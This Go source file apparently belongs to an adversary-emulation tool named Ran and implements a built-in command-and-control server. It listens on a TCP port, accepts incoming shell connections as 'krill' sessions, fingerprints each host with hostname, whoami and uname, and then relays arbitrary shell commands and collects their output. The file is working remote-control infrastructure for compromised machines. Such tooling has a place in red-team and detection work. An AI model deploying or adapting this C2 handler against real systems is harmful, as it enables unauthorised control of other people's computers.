package c2

import (
	"bufio"
	"context"
	"fmt"
	"log/slog"
	"net"
	"strconv"
	"strings"
	"sync"

	"github.com/Magier/Ran/domain"
)

var builtinC2Mutex sync.Mutex

const builtinKind = "Ran"

type BuiltInC2Server struct {
	cmdChannel  chan domain.Command
	ip          net.IP
	isReady     bool
	eventStream chan domain.Event
	sessions    map[string]Session
	cancel      context.CancelFunc
	wg          sync.WaitGroup
}

type Session struct {
	ID         string
	conn       net.Conn
	cmdChannel chan string
	results    chan any
}

func NewSession(id string, conn net.Conn) (Session, error) {
	return Session{
		ID:         id,
		conn:       conn,
		cmdChannel: make(chan string),
		results:    make(chan any),
	}, nil
}

func (s Session) End() {
	s.conn.Close()
	close(s.results)
}

var _ C2Client = (*BuiltInC2Server)(nil)

func NewBuiltInServer() *BuiltInC2Server {
	ip := GetOutboundIP()
	return &BuiltInC2Server{
		sessions:    make(map[string]Session),
		cmdChannel:  make(chan domain.Command, 1),
		ip:          ip,
		isReady:     false,
		eventStream: make(chan domain.Event, 1),
	}
}

func (c *BuiltInC2Server) Connect(parentCtx context.Context) error {
	c.eventStream <- domain.C2Connected{
		Name: BuiltInC2,
		IP:   c.GetServerIp(),
		Kind: "C2",
	}
	ctx, cancel := context.WithCancel(parentCtx)
	c.cancel = cancel

	c.wg.Add(1)
	go c.runDispatchLoop(ctx)
	return nil
}

// runDispatchLoop multiplexes between:
// - ctx cancellation
// - incoming commands (c.cmdChannel)
// It returns when ctx is cancelled or when the server events channel closes.
func (c *BuiltInC2Server) runDispatchLoop(
	ctx context.Context,
) {
	defer c.wg.Done()

	for {
		select {
		case <-ctx.Done():
			return

		case cmd, ok := <-c.cmdChannel:
			if !ok {
				c.cmdChannel = nil
				continue
			}
			event, err := c.handleCommand(cmd)
			if err != nil {
				slog.Error("Sliver C2: could not send cmd", "err", err)
			}
			if event != nil {
				select {
				case <-ctx.Done():
					return
				case c.eventStream <- event:
				}
			}

			// case evt, ok := <-events:
			// 	if !ok {
			// 		// Server event stream ended; stop the loop.
			// 		return
			// 	}
			// 	// go c.handleServerEvent(c.eventStream, evt)
		}
	}
}

func (c *BuiltInC2Server) Shutdown() {
	if c.cancel != nil {
		c.cancel()
	}
	close(c.cmdChannel)
	c.wg.Wait()
}

func (c *BuiltInC2Server) SetReady(state bool) C2Client {
	c.isReady = state
	return c
}

func (c *BuiltInC2Server) GetEventStream() <-chan domain.Event {
	return c.eventStream
}

func (c *BuiltInC2Server) IsReady() bool {
	builtinC2Mutex.Lock()
	defer builtinC2Mutex.Unlock()
	return c.isReady
}

func (c *BuiltInC2Server) Execute(ev domain.Command) (domain.Message, error) {
	c.cmdChannel <- ev
	return nil, nil
}

func (c *BuiltInC2Server) GetServerIp() net.IP {
	return c.ip
}

func (c *BuiltInC2Server) handleCommand(msg domain.Command) (domain.Event, error) {
	switch cmd := msg.(type) {
	case domain.StartListener:
		go func() {
			// TODO handle disconnecting listener
			err := c.startListener(context.Background(), cmd)
			if err != nil {
				c.eventStream <- TTPExecuted{
					EventImpl: domain.EventImpl{
						CmdId: cmd.ID,
					},
					ID:      msg.GetID(),
					Success: false,
					Results: []string{err.Error()},
				}
			}
		}()
	case domain.StopListener:
		err := c.stopListener(cmd)
		return nil, err
	default:
		return nil, nil
	}
	// TODO: Forward the command to the respective session
	return nil, nil
}

func (c *BuiltInC2Server) GetName() string {
	return ""
}

func (c *BuiltInC2Server) startListener(ctx context.Context, cmd domain.StartListener) error {
	listener, err := net.Listen("tcp", ":"+strconv.FormatUint(uint64(cmd.Port), 10))
	if err != nil {
		return fmt.Errorf("Unable to bind to port: %s", err)
	}
	defer listener.Close()

	listenerId := fmt.Sprintf("builtin_%s", cmd.Protocol)
	c.eventStream <- ListenerReady{
		EventImpl: domain.EventImpl{CmdId: cmd.ID},
		Name:      fmt.Sprintf("%s_%d", listenerId, cmd.Port),
		IP:        c.GetServerIp(),
		C2Name:    BuiltInC2,
		Port:      cmd.Port,
		Protocol:  domain.TCP,
	}
	numSessions := 0

	for {
		select {
		case <-ctx.Done():
			slog.InfoContext(ctx, "Shutting down listener")
			return nil
		default:
			// Accept incoming connections
			conn, err := listener.Accept()
			if err != nil {
				slog.Error(err.Error())
				continue
			}

			sessionID := "krill_" + strconv.Itoa(numSessions+1)
			session, err := NewSession(sessionID, conn)
			if err != nil {
				slog.Error("Could not create new C2 session: " + err.Error())
			} else {
				c.sessions[sessionID] = session
				numSessions++

				// Handle client connection in a goroutine
				// in := make(chan string, 5)
				// out := make(chan string, 5)
				go session.Start(ctx)
				defer session.End()

				for result := range session.results {
					switch r := result.(type) {
					case string:
						// TODO: fix this
						c.eventStream <- TTPExecuted{
							Results: []string{r},
						}
					case domain.Event:
						c.eventStream <- r
					}
				}
			}
		}
	}
}
func (c *BuiltInC2Server) stopListener(cmd domain.StopListener) error {
	return fmt.Errorf("Stopping builtin listener is not yet implemented!")
}

func (s Session) sendCommand(cmd string) (string, error) {
	writer := bufio.NewWriter(s.conn)
	// _, err := conn.Write([]byte(cmd))
	slog.Debug("Sent command: ", "cmd", cmd)
	if _, err := writer.WriteString(cmd + "\n"); err != nil {
		slog.Error("Error sending command: " + err.Error())
		return "", err
	}
	writer.Flush()
	// raw_result := make([]byte, 1024)
	reader := bufio.NewReader(s.conn)
	str, err := reader.ReadString('\n') // maybe use scanner instead?
	slog.Debug("Rx Simple IO:", str, "")
	if err != nil {
		slog.Error(fmt.Sprintf("Error receiving response for command '%s': %s", cmd, err.Error()))
		return "", err
	}
	return strings.Trim(str, "\n"), nil
}

func (s Session) Start(ctx context.Context) {
	defer s.End()
	slog.Debug("C2", "", "Handling session")

	_, err := s.sendCommand("unset PS1") // turn off the custom prompt
	if err != nil {
		slog.Error("Error unsetting PS1: " + err.Error())
		return
	}

	hostname, err := s.sendCommand("hostname")
	if err != nil {
		return
		// slog.Error("Error reading from connection: " + err.Error())
	}
	user, err := s.sendCommand("whoami")
	if err != nil {
		return
		// slog.Error("Error reading from connection: " + err.Error())
	}
	os, err := s.sendCommand("uname")
	if err != nil {
		return
		// slog.Error("Error reading from connection: " + err.Error())
	}
	s.results <- SessionStarted{
		C2Kind: builtinKind,
		Session: domain.Session{
			Id:       s.ID,
			Hostname: hostname,
			Os:       os,
			User:     user,
		}}

	for {
		select {
		case <-ctx.Done():
			return
		default:
			cmd := <-s.cmdChannel
			res, err := s.sendCommand(cmd)
			if err != nil {
				slog.Error("Coulnd't send command", "cmd", cmd, "error", err)
			}
			slog.Debug("Received data: " + string(res))
			s.results <- res
		}
	}
}
